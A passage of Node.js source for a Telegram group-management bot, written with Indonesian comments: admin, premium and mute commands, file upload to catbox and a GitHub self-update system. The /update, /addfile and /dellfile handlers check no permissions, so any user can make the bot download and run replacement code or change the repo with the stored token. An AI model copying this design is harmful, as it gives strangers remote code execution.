        bot.sendMessage(chatId, `⚡ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚡ You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "⚡ Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `⚡ User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "⚡ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "⚡ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `⚡ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/groupAktip/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(true); // Aktifkan mode hanya grup
        await bot.sendMessage(chatId, "✅ Mode hanya grup diaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat mengaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengaktifkan mode hanya grup.");
    }
});

// Command untuk menonaktifkan mode hanya grup
bot.onText(/\/groupNonaktif/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

    try {
        setOnlyGroup(false); // Nonaktifkan mode hanya grup
        await bot.sendMessage(chatId, "✅ Mode hanya grup dinonaktifkan!");
    } catch (error) {
        console.error("Kesalahan saat menonaktifkan mode hanya grup:", error);
        await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menonaktifkan mode hanya grup.");
    }
});
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); // Gunakan chatId dari grup tempat perintah dikeluarkan
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});

// Perintah /delgroup (menghapus grup tempat perintah dikeluarkan)
bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "eitsh mau apa lu🤨, gak tau malu jir😒, sana minta akses ke owner gua",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); // Gunakan chatId dari grup tempat perintah dikeluarkan
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});

bot.onText(/^\/delsesi$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  try {
    if (fs.existsSync(SESSIONS_DIR)) {
      fs.rmSync(SESSIONS_DIR, { recursive: true, force: true });
    }
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });

    if (fs.existsSync(SESSIONS_FILE)) {
      fs.unlinkSync(SESSIONS_FILE);
    }

    bot.sendMessage(chatId, "✅ Semua sesi berhasil dihapus.");
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal menghapus sesi.");
  }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return cfg && typeof cfg === "object" ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "anything-101";
const DEFAULT_REPO = UPD.github_repo_default || "Autoupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn =
  global.fetch ||
  ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(
    dir,
    `.update_tmp_${Date.now()}_${path.basename(targetPath)}`
  );
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, {
    headers: { "User-Agent": "ntba-update-bot" },
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(
      `Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`
    );
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error(
      "Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write)."
    );
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "ntba-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    // 404 => create baru
    if (!String(e.message).includes(" 404")) throw e;
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== NTBA HELPERS (ctx.reply replacement) ==================
async function send(chatId, text, opts = {}) {
  return bot.sendMessage(chatId, text, opts);
}

// Ambil args dari "/cmd@bot arg1 arg2"
function parseArgsFromMatch(matchArr) {
  const full = (matchArr && matchArr[0]) ? String(matchArr[0]) : "";
  const noCmd = full.replace(/^\/\w+(@\w+)?\s*/i, "");
  return noCmd.trim() ? noCmd.trim().split(/\s+/) : [];
}

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.onText(/^\/update(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;

    await send(chatId, "🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await send(
      chatId,
      `⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`,
      { parse_mode: "Markdown" }
    );

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await send(chatId, "✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await send(chatId, `❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfile <repo> (reply file .js)
bot.onText(/^\/addfile(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;

    const replied = msg.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return send(
        chatId,
        "❌ Reply file .js dulu, lalu ketik:\n/addfile <namerepo>\nContoh: /addfile Pullupdate"
      );
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return send(chatId, "❌ File harus .js");

    await send(
      chatId,
      `⬆️ Uploading *${fileName}* ke repo *${repo}*...`,
      { parse_mode: "Markdown" }
    );

    // NTBA: cara ambil link file
    const fileInfo = await bot.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${fileInfo.file_path}`;

    const res = await fetchFn(fileUrl);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await send(
      chatId,
      `✅ Berhasil upload *${fileName}* ke repo *${repo}*`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    await send(chatId, `❌ Gagal: ${err.message || String(err)}`);
  }
});

// /dellfile <repo> <path/file.js>
bot.onText(/^\/dellfile(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;
    const file = parts[1];

    if (!file) {
      return send(
        chatId,
        "Format:\n/dellfile <namerepo> <namefiles>\nContoh: /dellfile Pullupdate index.js"
      );
    }

    await send(
      chatId,
      `🗑️ Menghapus *${file}* di repo *${repo}*...`,
      { parse_mode: "Markdown" }
    );

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await send(
      chatId,
      `✅ Berhasil hapus *${file}* di repo *${repo}*`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    await send(chatId, `❌ Gagal: ${err.message || String(err)}`);
  }
});

bot.onText(/^\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = exec(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});

bot.onText(/\/listgroup/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "⛔ Fitur ini hanya untuk owner atau admin.");
  }

  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (!groupIds.length) {
      return bot.sendMessage(chatId, "📭 Belum ada grup yang ditambahkan.");
    }

    let text = `📋 *Daftar Grup yang Diizinkan:*\n\n`;

    for (const id of groupIds) {
      try {
        const chat = await bot.getChat(id);
        const title = chat.title || 'Tidak diketahui';
        text += `🔹 *${title}*\n🆔 \`${id}\`\n\n`;
      } catch {
        text += `⚠️ [Gagal ambil info] ID: \`${id}\`\n\n`;
      }
    }

    bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal membaca daftar grup:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membaca daftar grup.");
  }
});


// === /DEMOTE ADMIN DI TELEGRAM ===
bot.onText(/^\/demote$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-demote.");

  const userId = reply.from.id;

  try {
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false
    });

    bot.sendMessage(chatId, `✅ Sukses demote [user](tg://user?id=${userId}).`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal demote: ${err.message}`);
  }
});
// === /PROMOTE DENGAN CUSTOM ADMIN TITLE DI TELEGRAM ===
bot.onText(/^\/promote(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (String(senderId) !== String(OWNER_ID)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa pake perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) return bot.sendMessage(chatId, "❌ Balas pesan user yang mau di-promote.");

  const userId = reply.from.id;
  const label = match[1]?.trim();

  try {
    // Step 1: promote
    await bot.promoteChatMember(chatId, userId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: true,
      can_promote_members: false
    });

    // Step 2: kalau ada label, set sebagai custom admin title
    if (label) {
      await bot.setChatAdministratorCustomTitle(chatId, userId, label);
    }

    const name = reply.from.username ? `@${reply.from.username}` : `[user](tg://user?id=${userId})`;
    const status = label ? `\`${label}\`` : "*Admin*";

    bot.sendMessage(chatId, `✅ ${name} sekarang jadi ${status}`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal promote: ${err.message}`);
  }
});
// perintah untuk open dan close group
bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isOwner = admins.some(admin => admin.user.id === userId);
    if (!isOwner) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: false,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

bot.onText(/\/X/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Balas pesan yang ingin dihapus dengan perintah /X.");
  }

  // Cek izin
  const isGroup = msg.chat.type.includes("group");
  const isAllowed = isGroup ? await isOwner(chatId, fromId) || isOwner(fromId) : true;

  if (!isAllowed) {
    return bot.sendMessage(chatId, "⛔ Hanya admin/owner yang bisa menghapus pesan ini.");
  }

  const targetMessageId = msg.reply_to_message.message_id;

  try {
    await bot.deleteMessage(chatId, targetMessageId);           // hapus pesan target
    await bot.deleteMessage(chatId, msg.message_id);            // hapus command /X
  } catch (err) {
    console.error("Gagal hapus:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal menghapus pesan.");
  }
});

// === MUTE ===
bot.onText(/\/mute(?:\s+(\d+[a-zA-Z]+|selamanya))?/, async (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @RidzzOffc.",
            { parse_mode: "Markdown" }
        );
    }
  
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  let duration = 60; // default 60 detik
  const raw = match[1];

  if (raw) {
    if (raw.toLowerCase() === 'selamanya') {
      duration = 60 * 60 * 24 * 365 * 100; // 100 tahun
    } else {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s: 1, m: 60, h: 3600, d: 86400, w: 604800, mo: 2592000, y: 31536000 };
        duration = value * (unitMap[unit] || 60);
      }
    }
  }

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk mute.");

  try {
    const until = Math.floor(Date.now() / 1000) + duration;
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: false,
      until_date: until,
    });
    bot.sendMessage(chatId, `🔇 User dimute selama ${raw || '60s'} (${duration} detik)`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mute user.");
  }
});

// === UNMUTE ===
bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @RidzzOffc.",
            { parse_mode: "Markdown" }
        );
    }


  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk unmute.");

  try {
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
    });
    bot.sendMessage(chatId, `🔊 User telah di-unmute.`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal unmute user.");
  }
});


bot.onText(/\/info/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username;

    if (shouldIgnoreMessage(msg)) return;

    const repliedMessage = msg.reply_to_message;

    //--- PERUBAHAN: Cek apakah ada balasan (reply) ---
    if (!repliedMessage) {
       
        const replyOptions = {
            reply_to_message_id: msg.message_id, 
            parse_mode: 'Markdown',              
        };
        try {
            await bot.sendMessage(
                chatId,
                `
╭━━「 INFO KAMU 」⬣
×͜× Username: ${username ? `@${username}` : 'Tidak ada'}
×͜× ID: \`${senderId}\`
╰────────────────⬣
`,
                replyOptions
            );
        } catch (error) {
            console.error("Error saat mengirim pesan:", error);
            await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });

        }
        return; // Hentikan eksekusi lebih lanjut
    }

    //--- KODE SEBELUMNYA UNTUK BALASAN PESAN (TIDAK ADA PERUBAHAN DI SINI) ---
    const repliedUserId = repliedMessage.from?.id;

    if (!repliedMessage.from) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki informasi pengirim.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }

    if (!repliedUserId) {
        const errorMessage = "⚠️  Pesan yang Anda balas tidak memiliki ID pengguna.";
        await bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
        return;
    }
    const repliedUsername = repliedMessage.from.username;
    const repliedFirstName = repliedMessage.from.first_name;
    const repliedLastName = repliedMessage.from.last_name;
    const repliedFullName = repliedFirstName + (repliedLastName ? ` ${repliedLastName}` : '');

    const replyOptions = {
        reply_to_message_id: msg.message_id,
        parse_mode: 'Markdown',
    };

    try {
        await bot.sendMessage(
            chatId,
            `
╭━━「 INFO PENGGUNA 」━━━⬣
×͜× Username: ${repliedUsername ? `@${repliedUsername}` : 'Tidak ada'}
×͜× ID: \`${repliedUserId}\`
×͜× Nama: \`${repliedFullName}\`
╰────────────────⬣
*Diminta oleh* [${username ? `@${username}` : 'Anda'}]`,
            replyOptions
        );
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        await bot.sendMessage(chatId, "⚠️  Terjadi kesalahan saat memproses permintaan Anda.", { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
    }
});

// to url
async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    // Perbaiki: Gunakan data.getHeaders() dengan benar
    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(), // Gunakan getHeaders() di sini
        data: data
    };
    const api = await axios.request(config);
    return api.data;
}

// Handler perintah /tourl
function getFileExtension(contentType) {
    if (!contentType) {
        return '.bin'; // Default jika jenis konten tidak diketahui
    }
    if (contentType.includes('image/jpeg') || contentType.includes('image/jpg')) {
        return '.jpg';
    } else if (contentType.includes('image/png')) {
        return '.png';
    } else if (contentType.includes('image/gif')) {
        return '.gif';
    } else if (contentType.includes('video/mp4')) {
        return '.mp4';
    } else if (contentType.includes('video/quicktime')) {
        return '.mov'; // Contoh untuk video quicktime
    } else if (contentType.includes('audio/mpeg')) {
        return '.mp3';
    } else if (contentType.includes('audio/ogg')) {
        return '.ogg';
    } else if (contentType.includes('application/pdf')) {
        return '.pdf';
    } else if (contentType.includes('application/zip')) {
        return '.zip';
    } else {
        return '.bin'; // Default atau gunakan '.dat', dll.
    }
}


// Handler perintah /tourl
bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const message = msg;
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`Lu bukan penguna premium\`\`\`
Minta akses sana ke Bos gua
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝙤𝙬𝙣𝙚𝙧", url: "https://t.me/RidzzOffc" }]
      ]
    }
  });
}
        if (message.reply_to_message) {
            const repliedMessage = message.reply_to_message;
            let fileId;
            let contentType; // Tambahkan untuk menyimpan jenis konten

            if (repliedMessage.photo) {
                fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
                contentType = 'image/jpeg';  // Default untuk foto, Anda mungkin perlu logika tambahan jika ada beberapa ukuran
            } else if (repliedMessage.video) {
                fileId = repliedMessage.video.file_id;
                contentType = 'video/mp4'; // Default untuk video
            } else if (repliedMessage.document) {
                fileId = repliedMessage.document.file_id;
                contentType = repliedMessage.document.mime_type; // Ambil jenis konten dari dokumen
            } else if (repliedMessage.audio) {
                fileId = repliedMessage.audio.file_id;
                contentType = repliedMessage.audio.mime_type; // Ambil jenis konten dari audio
            } else {
                return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
            }

            // Unduh file dari Telegram
            const fileInfo = await bot.getFile(fileId);
            const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
            const response = await axios.get(fileLink, { responseType: 'stream' });

            // Dapatkan ekstensi file
            const fileExtension = getFileExtension(contentType);
            // Buat nama file dengan ekstensi yang benar
            const filePath = `./temp_${Date.now()}${fileExtension}`;

            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

            // Unggah file ke CatBox
            const catBoxUrl = await CatBox(filePath);
            const result = `📦 *CatBox*: ${catBoxUrl || '-'}\n
            ᴄʀᴇᴀᴛᴇ ʙʏ ᴅʀᴀɢᴏɴ⸙`;
            bot.sendMessage(chatId, result, { parse_mode: 'Markdown', reply_to_message_id: repliedMessage.message_id });

            // Hapus file sementara
            fs.unlinkSync(filePath);

        } else {
            return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
        }

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
});

// === ANTILINK ON/OFF ===
bot.onText(/\/antilink (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "❌ Maaf fitur ini khusus @RidzzOffc.",
            { parse_mode: "Markdown" }
        );
    }
  
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const status = match[1].toLowerCase() === "on";
  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].antilink = status;
  saveGroupSettings();

  bot.sendMessage(chatId, `🔗 Antilink *${status ? 'AKTIF' : 'NONAKTIF'}*`, { parse_mode: "Markdown" });
});

// === ZETTA GUARD – FITUR ADD MEMBER + LINK SEKALI PAKAI ===
bot.onText(/\/add\s+@?(\w+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];
  const senderId = msg.from.id;

  if (!msg.chat.type.includes('group')) return;

  try {
    const admin = await bot.getChatMember(chatId, senderId);
    if (!['creator', 'administrator'].includes(admin.status)) {
      return bot.sendMessage(chatId, '❌ Hanya admin yang bisa pakai perintah ini.');
    }
  } catch (e) {
    return bot.sendMessage(chatId, '⚠️ Gagal verifikasi admin.');
  }

  try {
    const invite = await bot.createChatInviteLink(chatId, {
      expire_date: Math.floor(Date.now() / 1000) + 3600, // 1 jam dari sekarang
      member_limit: 1 // hanya 1 orang bisa pakai
    });

    const text = `📨 *Link undangan khusus untuk @${username}*\n\n` +
                 `📋 *Salin & kirim ke dia:*\n` +
                 `🎟️ Nih link buat lu join grup (1x pakai, berlaku 1 jam):\n${invite.invite_link}\n\n` +
                 `💬 *Atau langsung chat @${username} dari tombol di bawah ini*`;

    const opts = {
